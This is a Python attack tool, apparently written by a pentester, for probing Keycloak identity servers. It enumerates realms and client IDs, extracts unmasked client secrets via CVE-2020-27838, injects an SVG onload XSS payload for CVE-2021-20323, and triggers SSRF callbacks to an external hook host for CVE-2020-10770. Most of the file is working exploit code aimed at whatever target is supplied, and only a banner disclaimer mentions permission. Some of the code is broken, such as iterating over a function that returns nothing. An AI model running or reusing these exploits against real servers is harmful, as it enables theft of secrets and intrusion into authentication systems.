import requests
import sys
import getopt
import re
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# Desabilitar warnings de certificado inseguro
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tratamento de interrupção por Ctrl+C
def signal_handler(sig, frame):
    print("\n[!] Interrompido pelo usuário. Encerrando...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Banner


def exibir_banner():
    banner = r"""
    ============================================================
     _  __               _             _       _____       _                 
    | |/ /              | |           | |     / ____|     (_)                
    | ' / ___ _   _  ___| | ___   __ _| | __ | (___  _ __  _ _ __   ___ _ __ 
    |  < / _ \ | | |/ __| |/ _ \ / _` | |/ /  \___ \| '_ \| | '_ \ / _ \ '__|
    | . \  __/ |_| | (__| | (_) | (_| |   <   ____) | | | | | |_) |  __/ |   
    |_|\_\___|\__, |\___|_|\___/ \__,_|_|\_\ |_____/|_| |_|_| .__/ \___|_|   
               __/ |                                        | |              
              |___/            By Bl4dsc4n                  |_|              
    ============================================================
    Uso: script.py [opções] --url <url> --realms <arquivo_de_realms>

    Opções:
      -a   Localizar Realms name: <URL>/auth/realms/{realm-name}
      -b   Enumeração de IDs de clientes: <URL>/auth/realms/{realm-name}/protocol/openid-connect/auth?client_id=account
      -c   Testando acesso aos clientes: <URL>/auth/admin/realms/{realm-name}/clients
      -d   Testa vulnerabilidade CVE-2020-27838 Secret exposto
      -e   Testa vulnerabilidade CVE-2021-20323 (XSS) openid-connect
      -f   Testa vulnerabilidade CVE-2021-20323 (XSS) default
      -g   Verifica a vulnerabilidade CVE-2020-10770 SSRF 
      -h   Help

    Parâmetros obrigatórios:
      --url       Define a URL base (ex.: https://example.com)
      --realms    Define o arquivo contendo a lista de realms a serem testados

    Exemplos de uso:
      Localizar Realms name:
          python3 script.py -a --url https://example.com --realms realms.txt

      Testar XSS (CVE-2021-20323):
          python3 script.py -f --url https://example.com --realms realms.txt

      Testar SSRF (CVE-2020-10770):
          python3 script.py -g --url https://example.com --realms realms.txt --hook c1746zvrghiftrf8k9j0prdk19.oastify.com

      Testar várias opções juntas:
          python3 script.py -a -b -d --url https://example.com --realms realms.txt
          python3 script.py -abcdef --url https://example.com --realms realms.txt

    * Este script realiza testes no "Keycloak" uma ferramenta de gerenciamento
      de identidade e acesso (IAM - Identity and Access Management).
      Certifique-se de ter permissão antes de executar.

    Desenvolvido por Carlos Tuma - Bl4dsc4n - Version 0.1
    ============================================================
    """
    print(banner)


# Funções modificadas para suportar threads
def funcao1_thread(url, realm):
    try:
        full_url = f"{url}/auth/realms/{realm}"
        response = requests.get(full_url, verify=False, allow_redirects=False, timeout=5)
        if response.status_code in [200]:
            return f"{realm}: {response.status_code}"
    except requests.exceptions.SSLError:
        return f"[Erro] Realm {realm}: Falha no SSL. Certificado inválido."
    except requests.exceptions.RequestException as e:
        return f"[Erro] Realm {realm}: {str(e)}"

def funcao2_thread(url, realm):
    try:
        full_url = f"{url}/auth/realms/{realm}/protocol/openid-connect/auth?client_id=account"
        response = requests.get(full_url, verify=False, timeout=5)
        actions = re.findall(r'action="([^"]+)"', response.text)
        return [action for action in actions]
    except requests.exceptions.RequestException as e:
        return f"[Erro] Realm {realm}: {str(e)}"

def funcao3_thread(url, realm):
    try:
        full_url = f"{url}/auth/admin/realms/{realm}/clients"
        response = requests.get(full_url, verify=False, allow_redirects=False, timeout=5)
        if response.status_code in [200, 401, 403]:
            return f"Testando Realms: {realm} - {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"[Erro] Realm {realm}: {str(e)}"


def funcao4_thread(url, realm):
    try:
        full_url = f"{url}/auth/realms/{realm}/clients-registrations/default/security-admin-console"
        response = requests.get(full_url, verify=False, allow_redirects=False, timeout=5)
        
        if response.status_code == 200:
            try:
                # Tenta interpretar a resposta como JSON
                data = response.json()
                secret = data.get("secret", "Não encontrado")
                
                # Ignorar secrets mascarados
                if secret and (secret == "**********" or all(char == '*' for char in secret)):
                    return None  # Ignorar este caso
                
                # Exibir secrets não mascarados
                return f"Realms: {realm} - Explorável CVE-2020-27838 - Secret: {secret}"
            except ValueError:
                return f"Realms: {realm} - Explorável CVE-2020-27838 - Secret não disponível (Resposta não é JSON)"
        else:
            return f"Realms: {realm} - Status code: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"[Erro] Realm {realm}: {str(e)}"



def funcao5_thread(url, realm):
    try:
        full_url = f"{url}/auth/realms/{realm}/clients-registrations/openid-connect"
        data = {"<svg onload=alert('Tuma-Keyclok-XSS')>": 1}
        response = requests.post(full_url, json=data, verify=False, allow_redirects=False, timeout=5)
        if re.search(r'Unrecognized field "<svg onload=alert\(', response.text):
            return f"Possível XSS realms: {realm} - Reflect - CVE-2021-20323"
    except requests.exceptions.RequestException as e:
        return f"[Erro] Realm {realm}: {str(e)}"


def funcao6_thread(url, realm):
    try:
        full_url = f"{url}/auth/realms/{realm}/clients-registrations/default"
        data = {"<svg onload=alert('Tuma-Keyclok-XSS')>": 1}
        response = requests.post(full_url, json=data, verify=False, allow_redirects=False, timeout=5)
        if re.search(r'Unrecognized field "<svg onload=alert\(', response.text):
            return f"Possível XSS realms: {realm} - Reflect - CVE-2021-20323"
    except requests.exceptions.RequestException as e:
        return f"[Erro] Realm {realm}: {str(e)}"


def check_cve_2020_10770(url, realms, hook_argument):
    """
    Verifica a vulnerabilidade CVE-2020-10770 para cada realm, enviando uma requisição para o endpoint vulnerável.

    Args:
        url (str): URL base do Keycloak.
        realms (list): Lista de realms.
        hook_argument (str): Valor para o argumento "{hook}" na URL vulnerável.

    Returns:
        None
    """

    for realm in realms:
        vulnerable_url = f"{url}/auth/realms/{realm}/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{hook_argument}"
        try:
            response = requests.get(vulnerable_url, verify=False, timeout=5)
            # Não é necessário processar a resposta, pois o objetivo é apenas enviar a requisição
            print(f"Requisição enviada para {realm}: {vulnerable_url}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar requisição para {realm}: {str(e)}")


def execute_in_threads(url, realms, func):
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(func, url, realm): realm for realm in realms}
        for future in as_completed(futures):
            result = future.result()
            if result:
                if isinstance(result, list):
                    for item in result:
                        print(item)
                else:
                    print(result)
                results.append(result)
    return results


# Função principal
def main(argv):
    url = ""
    realms_file = ""
    hook_argument = ""

    try:
        opts, args = getopt.getopt(argv, "abcdefgh", ["url=", "realms=", "hook=", "all"])
        for opt, arg in opts:
            if opt == "--url":
                url = arg
                if "/auth/" in url:
                    realm_input = url.split("/auth/realms/")[1].split("/")[0]
                    url = url.split("/auth/realms/")[0]
            elif opt == "--realms":
                realms_file = arg
            elif opt == "--hook":
                hook_argument = arg

        if not (realms_file or realm_input) or not url:
            exibir_banner()
            sys.exit(2)

        if realms_file: 
            with open(realms_file) as f:
                realms = [line.strip() for line in f]
        else:
            realms = [realm_input]

        print(f"Realms: {realms}")

        for opt, _ in opts:
            if opt == "-a":
                print(f"{url}/auth/realms/<realm-name>")
                execute_in_threads(url, realms, funcao1_thread)
            elif opt == "-b":
                print(f"{url}/auth/realms/<realm-name>/protocol/openid-connect/auth?client_id=account")
                execute_in_threads(url, realms, funcao2_thread)
            elif opt == "-c":
                print(f"{url}/admin/realms/<realm-name>/clients")
                execute_in_threads(url, realms, funcao3_thread)
            elif opt == "-d":
                print(f"{url}/auth/realms/<realm-name>/clients-registrations/default/security-admin-console")
                execute_in_threads(url, realms, funcao4_thread)
            elif opt == "-e":
                print(f"{url}/auth/realms/<realm-name>/clients-registrations/openid-connect")
                execute_in_threads(url, realms, funcao5_thread)
            elif opt == "-f":
                print(f"{url}/auth/realms/<realm-name>/clients-registrations/default")
                execute_in_threads(url, realms, funcao6_thread)
            elif opt == "-g":
                if not hook_argument:
                    print("Erro: O argumento --hook é obrigatório.")
                    sys.exit(2)
                print(f"Testando Realms para CVE-2020-10770 com argumento '{hook_argument}' para {{hook}}")
                results = check_cve_2020_10770(url, realms, hook_argument)
                for result in results:
                    print(result)
            elif opt == "--all":
                print(f"{url}/auth/realms/<realm-name>")
                execute_in_threads(url, realms, funcao1_thread)
                print(f"{url}/auth/realms/<realm-name>/protocol/openid-connect/auth?client_id=account")
                execute_in_threads(url, realms, funcao2_thread)
                print(f"{url}/admin/realms/<realm-name>/clients")
                execute_in_threads(url, realms, funcao3_thread)
                print(f"{url}/auth/realms/<realm-name>/clients-registrations/default/security-admin-console")
                execute_in_threads(url, realms, funcao4_thread)
                print(f"{url}/auth/realms/<realm-name>/clients-registrations/openid-connect")
                execute_in_threads(url, realms, funcao5_thread)
                print(f"{url}/auth/realms/<realm-name>/clients-registrations/default")
                execute_in_threads(url, realms, funcao6_thread)

                if not hook_argument:
                    print("Erro: O argumento --hook é obrigatório.")
                    sys.exit(2)
                print(f"Testando Realms para CVE-2020-10770 com argumento '{hook_argument}' para {{hook}}")
                results = check_cve_2020_10770(url, realms, hook_argument)
                for result in results:
                    print(result)         
            elif opt == "-h":
                exibir_banner()
                sys.exit(0)

    except getopt.GetoptError as e:
        print(f"[Erro] {str(e)}")
        exibir_banner()
        sys.exit(2)
    except FileNotFoundError as e:
        print(f"[Erro] Arquivo não encontrado: {e.filename}")
        sys.exit(2)
    except Exception as e:
        print(f"[Erro] {str(e)}")
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])
